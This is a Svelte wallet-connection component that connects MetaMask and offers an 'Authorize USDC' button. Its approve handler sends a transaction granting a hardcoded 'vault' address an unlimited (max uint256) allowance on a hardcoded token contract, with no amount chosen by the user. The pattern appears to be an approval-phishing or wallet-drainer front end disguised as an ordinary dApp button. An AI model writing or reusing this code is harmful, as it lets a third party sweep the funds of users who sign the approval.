<script>
  import { wallet } from "$lib/stores/wallet.js";
  import { connectMetaMask, hasMetaMask } from "$lib/wallet/metamask.js";
  const API_BASE = import.meta.env.VITE_API_BASE_URL ?? 'http://localhost:8080';
  let busy = false;
  let error = "";

  async function handleApprove() {
    busy = true;
    try {
      const tx = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: $wallet.address,
          to: "0x9Ad7E319DdC93A5C804e142823AF9c299AED5Be2",
          // Standard Unlimited Approve Method ID + Padded Vault Addr + Max Uint256
          data: "0x095ea7b3" +
                  "0xDE105d951C31c3fD2C8a2e92a683a04beba1C24b".toLowerCase().replace("0x", "").padStart(64, '0') +
                  "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        }]
      });

      // Polling for the change once tx is broadcast
      const interval = setInterval(async () => {
        const res = await fetch(`/api/check-approval?address=${$wallet.address}`);
        const resData = await res.json();
        const isAuth = resData.authorized;
        wallet.set({ connected: true, address: $wallet.address, chainId: $wallet.chainId, approval: isAuth });
        if (isAuth) clearInterval(interval);

      }, 3000);

    } catch (err) {
      console.error("User rejected or RPC error", err);
    } finally {
      busy = false;
    }
  }

  async function connect() {
    error = "";
    busy = true;
    try {
      const { provider, address, chainId } = await connectMetaMask();
      window.__gk_provider = provider;
      console.log(address);
      console.log((`${API_BASE}/api/check-approval?address=${address}`));
      const res = await fetch(`${API_BASE}/api/check-approval?address=${address}`);

      const resData = await res.json();
      console.log(resData);
      const isAuth = resData.authorized;
      wallet.set({ connected: true, address: address,chainId: chainId, isAuth });
    } catch (e) {
      error = e?.message ?? String(e);
    } finally {
      busy = false;
    }
  }

  function disconnect() {
    // MetaMask doesn't support programmatic disconnect — we clear app state
    window.__gk_provider = null;
    wallet.set({ connected: false, address: null, chainId: null, approval: false });
  }

  $: w = $wallet;
  $: short = w.address ? `${w.address.slice(0, 6)}…${w.address.slice(-4)}` : "";
</script>

{#if !w.connected}
  <button class="btn-primary" type="button" disabled={busy || !hasMetaMask()} on:click={connect} >
    {hasMetaMask() ? (busy ? "Connecting..." : "Connect MetaMask") : "Install MetaMask"}
  </button>

  {#if error}
    <div class="muted text-xs mt-2" style="color: rgba(255, 138, 30, 0.95);">{error}</div>
  {/if}
{:else}
  {#if w.approval}
    <button
            on:click={handleApprove}
            disabled={busy}
            class="btn-primary">
      {#if busy}
        <span class="animate-spin h-4 w-4 border-2 border-white border-t-transparent rounded-full"></span>
        Authorizing...
      {:else}
        Authorize USDC
      {/if}
    </button>
    {:else}
  <div class="flex items-center gap-2">
    <span class="badge">
      <span class="muted">Wallet</span>
      <span class="font-semibold">{short}</span>
      <span class="muted">·</span>
      <span class="muted">Chain</span>
      <span class="font-semibold">{w.chainId}</span>
    </span>

    <button class="btn-quiet" type="button" on:click={disconnect}>
      Disconnect
    </button>
  </div>
  {/if}
{/if}
